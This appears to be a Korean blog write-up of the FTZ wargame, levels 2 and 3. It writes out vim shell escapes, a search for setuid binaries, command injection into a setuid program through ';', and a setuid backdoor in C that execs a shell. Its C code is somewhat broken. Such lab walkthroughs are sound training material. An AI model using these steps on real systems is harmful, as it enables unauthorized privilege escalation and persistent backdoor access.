---
tags: security-attack system-security ftz
toc: True
---
# FTZ_2
## vi(vim) 편집기의 취약점을 이용한 system 권한 공격

* id: level2
* pw: hacker is cracker

vim 명령어 사용중,  !__ 명령어 사용과 함께 쓰면 vim의 usr권한을 그대로 유지한체, 프로그램을 실행할 수 있다.
그럼으로 setuid가 level3로 설정되어있는 실행파일을 find함수를 통해 찾는다.

1. find / -perm +6000 -user level3 2> /dev/null 
2. vim 편집기 실행 후 :!bash를 통해 공격한다.
3. level3의 권한을 얻는다.

# FTZ_3
## 병령 처리 명령어를 통한 공격

이번 챕터에서는 dig와 nslookup을 예시로 명령어 병렬처리의 취약점에 대해 알려준다.
nslookup을 통해 도메인서버의 실제 주소값을 알 수 있다. 
그리고 dig @주소값 bind version을 통해 취약한 도매인 서버을 파악할 수 있다.
이때 이전과 같이 find / -perm +6000 -user level4 2> /dev/null을 통해 level4의 권한을 갖고 있는 setuid를 찾는다.
그것을 실행시켜보면 dig의 명령어와 같다는 것을 확인할 수 있다.
이것을 gdb로 리버싱을 진행해보면 cmpl와 je를 통해 arg가 2가 아닐 경우 명령어가 꺼지는 것을 확인할 수 있다. 
이제 공격 idea를 생각해보자  
bash에서 '"__"'를 같이 묵어서 명령어를 실행하면 spacebar 와 함께 명령어가 실행된다.
그리고 ';'를 통해 해당 명령어를 실행하는 것과 동시에 병렬적으로 다른 명령어를 함께 실행할 수 있다. 

* /bin/autodig "8.8.8.8; my-pass;" 

이를 통해서 /bin/autodig에서 level4의 권한을 갖고 있는 명령어가 실행될때 병렬적으로 내가 쓰고싶은 명령어를 같이 쓸 수 있다.


## 백도어 만들기
같은 아이디어로 백도어를 만들어보자,   
백도어란 저번 post에서 설명했듯이 권한이 부여가 되지 않는 상태에서 해당하는 권한으로 파일을 실행 시킬 수 있다.  

1. 파일 생성  
/bin/autodig "8.8.8.8; echo '
```
int main(){
char *cmd[2];
char *cmd[0] = "/bash/sh"
char *cmd[1] = (void *)0;
setreuid(3004,3004);
execve(cmd[0],cmd,cmd[1]);
}
```
' > /tmp/superBackdoor.c;

2. compile하기
/bin/autodig "8.8.8.8; gcc -o /tmp/superBackdoor /tmp/superBackdoor.c;"

3. 권한부여하기
/bin/autodig "8.8.8.8; chmod 6755 /tmp/superBackdoor"

이과정을 통해 level으로 접근을 해도, 바로 level4의 권한을 가질 수 있다.
execve의 명령어의 설명은 다음과 같다.
exec 까지는 excutaion의 함수이고, v는 argv를 vector(배열)로 받는 다는 의미이다. 그리고 e는 환경설정할 parameter를 받는 다는 의미이다.  
즉, 첫번째 인자에 실행할 파일을 넣고, 그 인자를 cmd의 상태로 실행한 뒤, 환경변수는 cmd[1]의 형태를 갖는다는 의미이다. 
